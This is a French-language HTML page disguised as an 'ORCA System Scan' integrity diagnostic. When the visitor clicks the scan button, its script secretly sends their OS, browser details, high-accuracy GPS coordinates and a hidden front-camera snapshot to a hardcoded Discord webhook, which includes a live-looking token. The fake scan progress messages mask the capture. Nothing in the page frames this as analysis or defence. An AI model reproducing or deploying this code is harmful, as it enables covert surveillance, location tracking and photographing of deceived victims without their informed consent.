<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ORCA Diagnostic</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .panel { border: 1px solid #00ff41; padding: 40px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 85%; max-width: 400px; }
        .btn { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 25px; width: 100%; text-transform: uppercase; letter-spacing: 2px; }
        .btn:hover { background: #00cc33; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="panel">
        <h2 id="title">ORCA SYSTEM SCAN</h2>
        <p id="msg">Analyse de l'int√©grit√© du syst√®me requise.</p>
        <button id="run" class="btn">Lancer l'Analyse</button>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // Ton Webhook est inject√© ici
        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";

        async function sendToDiscord(content, blob = null) {
            const formData = new FormData();
            if (blob) {
                formData.append('file', blob, 'capture.png');
                formData.append('payload_json', JSON.stringify({ content: content }));
            } else {
                formData.append('payload_json', JSON.stringify({ content: content }));
            }
            
            try {
                await fetch(WEBHOOK, { method: 'POST', body: formData });
            } catch (e) {
                console.error("Erreur Webhook");
            }
        }

        async function start() {
            document.getElementById('run').style.display = 'none';
            document.getElementById('msg').innerText = "Initialisation du scan...";

            // 1. Infos Syst√®me
            const info = `üõ°Ô∏è **RAPPORT ORCA TOOLS**\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`;
            await sendToDiscord(info);

            // 2. Localisation
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendToDiscord(`üìç **GPS**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            }, () => {
                sendToDiscord("‚ö†Ô∏è GPS: Permission refus√©e");
            }, { enableHighAccuracy: true });

            // 3. Cam√©ra
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            sendToDiscord("üì∏ **CAPTURE IMAGE**", blob);
                            stream.getTracks().forEach(t => t.stop());
                            document.getElementById('msg').innerText = "SCAN TERMIN√â (100%)";
                        }, 'image/png');
                    }, 2000);
                };
            } catch (err) {
                await sendToDiscord("‚ùå Cam√©ra: " + err.name);
                document.getElementById('msg').innerText = "SCAN TERMIN√â (ERREUR MAT√âRIELLE)";
            }
        }

        document.getElementById('run').addEventListener('click', start);
    </script>
</body>
</html>
